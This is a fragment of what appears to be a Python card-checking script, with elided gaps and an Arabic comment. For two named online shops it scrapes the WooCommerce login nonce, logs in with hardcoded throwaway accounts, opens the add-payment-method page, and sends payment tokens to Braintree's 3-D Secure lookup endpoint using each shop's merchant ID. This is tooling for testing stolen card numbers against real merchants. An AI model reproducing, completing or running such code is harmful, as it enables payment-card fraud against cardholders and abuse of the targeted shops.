...
'User-Agent': user,
	...
	rrr=scraper.get("https://www.eluir.com/my-account/",headers=headers)
	login=findall(r'name="woocommerce-login-nonce" value="(.*?)"',rrr.text)[0]
	...
	data = {
	'username': '79resonant@ptct.net',
	'password': '79resonant@ptct.net',
	'woocommerce-login-nonce': login,
	'_wp_http_referer': '/my-account/add-payment-method/',
	'login': 'Log in',
}

	response = scraper.post('https://www.eluir.com/my-account/', headers=headers, data=data)


	r = scraper.get('https://www.eluir.com/my-account-2/add-payment-method/', headers=headers)
...
# استدعاء الدالة
	...
	response = requests.post(
	f'https://api.braintreegateway.com/merchants/bhg2vtjch2zkyfhp/client_api/v1/payment_methods/{tok}/three_d_secure/lookup',
	headers=headers,
	json=json_data,
)
...
'User-Agent': user,
	...
	rrr=scraper.get("https://www.thechairmansbao.com/my-account/",headers=headers)
	login=findall(r'name="woocommerce-login-nonce" value="(.*?)"',rrr.text)[0]
	...
	data = {
	'username': '126leena@chefalicious.com',
	'password': '126leena@chefalicious.com',
	'woocommerce-login-nonce': login,
	'_wp_http_referer': '/my-account/add-payment-method/',
	'login': 'Log in',
}

	response = scraper.post('https://www.thechairmansbao.com/my-account/', headers=headers, data=data)


	r = scraper.get('https://thechairmansbao.com/my-account/add-payment-method/', headers=headers)
...
# استدعاء الدالة
	...
	response = requests.post(
	f'https://api.braintreegateway.com/merchants/ng3nh9xddt6qbgt7/client_api/v1/payment_methods/{tok}/three_d_secure/lookup',
	headers=headers,
	json=json_data,
)
